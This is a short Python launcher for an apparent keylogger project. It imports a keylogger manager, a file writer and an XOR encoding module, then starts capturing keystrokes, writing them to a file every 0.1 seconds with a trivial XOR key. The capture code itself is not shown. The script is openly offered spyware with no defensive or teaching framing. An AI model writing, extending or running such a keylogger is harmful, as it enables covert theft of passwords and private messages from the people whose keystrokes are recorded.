from encryptions.xor import Xor
from keylogger.manager import KeyLoggerManager
from writers.file_writer import SaveToFile

if __name__ == "__main__":
    m = KeyLoggerManager(save_interval=0.1, saving=SaveToFile, encryption=Xor, key=7)
    m.run()
